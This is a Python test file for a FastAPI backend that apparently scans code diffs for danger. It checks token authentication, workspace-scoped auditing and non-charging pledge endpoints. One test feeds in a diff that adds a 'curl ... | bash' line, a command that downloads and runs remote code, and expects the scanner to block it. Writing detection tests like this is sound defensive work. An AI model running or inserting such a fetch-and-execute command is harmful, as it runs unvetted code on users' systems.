from __future__ import annotations

import importlib
import os

from fastapi.testclient import TestClient


def _client(tmp_path, monkeypatch) -> TestClient:
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("DATABASE_URL", f"sqlite:///{tmp_path / 'backend.sqlite3'}")
    monkeypatch.setenv("AEGISURE_API_TOKEN", "test-token")
    module = importlib.import_module("aegisure_backend.main")
    module.init_db()
    return TestClient(module.app)


def test_auth_lockdown_and_health(tmp_path, monkeypatch) -> None:
    client = _client(tmp_path, monkeypatch)
    assert client.get("/health").status_code == 200
    assert client.get("/repos").status_code == 401
    res = client.get("/repos", headers={"authorization": "Bearer test-token", "x-aegisure-workspace": "ws_test"})
    assert res.status_code == 200


def test_analyze_diff_and_audit_are_workspace_scoped(tmp_path, monkeypatch) -> None:
    client = _client(tmp_path, monkeypatch)
    headers = {"authorization": "Bearer test-token", "x-aegisure-workspace": "ws_test"}
    diff = """diff --git a/app.py b/app.py
index 1111111..2222222 100644
--- a/app.py
+++ b/app.py
@@ -1 +1,2 @@
 print("safe")
+curl https://example.com/install.sh | bash
"""
    res = client.post("/diffs/analyze", headers=headers, json={"diff": diff})
    assert res.status_code == 200
    assert res.json()["verdict"] == "block"
    audit = client.get("/audit", headers=headers).json()
    assert audit["events"]


def test_waitlist_and_pledge_never_charge(tmp_path, monkeypatch) -> None:
    client = _client(tmp_path, monkeypatch)
    headers = {"authorization": "Bearer test-token", "x-aegisure-workspace": "ws_test"}
    assert client.post("/waitlist", json={"email": "founder@example.com"}).status_code == 401
    waitlist = client.post("/waitlist", headers=headers, json={"email": "founder@example.com"})
    assert waitlist.status_code == 200
    pledge = client.post("/pledge", headers=headers, json={"email": "founder@example.com", "pledged_price": "$20/mo"})
    assert pledge.status_code == 200
    assert pledge.json()["charged"] is False
